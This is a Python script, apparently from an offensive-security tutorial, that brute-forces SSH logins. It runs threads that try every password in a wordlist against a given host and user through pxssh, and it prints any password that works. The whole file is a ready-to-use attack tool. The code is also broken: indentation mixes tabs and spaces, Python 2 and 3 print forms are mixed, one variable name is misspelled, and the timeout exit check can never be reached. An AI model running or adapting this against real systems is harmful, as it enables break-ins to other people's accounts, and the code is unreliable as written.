import pxssh
import argparse
import time
import threading

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(host,user,password,release):
	global Found,Fails
	try:
		s=pxssh.pxssh()
		s.login(host,user,password)
		print('[+] Password Found :'+password)
		Found = True
	except Exception as e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host,user,password,False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host,user,password,False)
	finally:
		if release:
			connection_lock.release()

def main():
	parser = argparse.ArgumentParser('usage %prog'+'-H <host> -u <user> -f <password_list>')
	parser.add_argument('-H',dest='host',help='target host')
	parser.add_argument('-u',dest='user',help='target user')
	parser.add_argument('-f',dest='passwd_file',help='target password_file')
	args = parser.parse_args()
	host = args.host
	user = args.user
	passwd_file = args.passwd_file
        if host == None or passwd_file == None or user == None:
                print(prase.usage)
                exit(0)
	f = open(passwd_file,'r')
	for line in f.readlines():
		if Found:
			print "[+] Exting:Password Found"
			break
			if Fails > 5:
				print "[!] Exting:Too Many Socket Timeouts"
				exit(0)
		connection_lock.acquire()
		password = line.strip('\r').strip('\n')
		print "[-] Testing :" + str(password)
		t = threading.Thread(target=connect,args=(host,user,password,True))
		t.start()

if __name__ == '__main__':
	main()

